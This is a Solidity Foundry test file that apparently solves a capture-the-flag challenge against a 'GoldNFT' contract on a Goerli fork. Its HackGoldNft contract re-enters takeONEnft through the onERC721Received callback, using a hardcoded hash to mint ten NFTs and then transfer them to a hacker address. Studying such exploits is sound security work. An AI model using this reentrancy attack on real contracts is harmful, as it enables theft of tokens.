// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "../src/GoldNFT.sol";

contract Hack is Test {
    GoldNFT nft;
    HackGoldNft nftHack;
    address owner = makeAddr("owner");
    address hacker = makeAddr("hacker");

    function setUp() external {
        vm.createSelectFork(vm.envString("goerli"), 8591866); 
        nft = new GoldNFT();
    }

    function test_Attack() public {
        vm.startPrank(hacker);

        // solution
        nftHack = new HackGoldNft(nft, hacker);
        nftHack.pwn();
        
        assertEq(nft.balanceOf(hacker), 10);
    }
}

contract HackGoldNft {
    GoldNFT nft;
    address hacker;

    constructor(GoldNFT _nft, address _hacker) {
        nft = _nft;
        hacker = _hacker;
    }

    function pwn() external {
        nft.takeONEnft(0x23ee4bc3b6ce4736bb2c0004c972ddcbe5c9795964cdd6351dadba79a295f5fe);
        for (uint256 i = 1; i <= 10; i++) {
            nft.transferFrom(address(this), hacker, i);
        }
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        if (nft.balanceOf(address(this)) < 10) {
            nft.takeONEnft(0x23ee4bc3b6ce4736bb2c0004c972ddcbe5c9795964cdd6351dadba79a295f5fe);
        }

        return IERC721Receiver.onERC721Received.selector;
    }
}

interface IERC721Receiver {
    /**
     * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
     * by `operator` from `from`, this function is called.
     *
     * It must return its Solidity selector to confirm the token transfer.
     * If any other value is returned or the interface is not implemented by the recipient, the transfer will be
     * reverted.
     *
     * The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`.
     */
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4);
}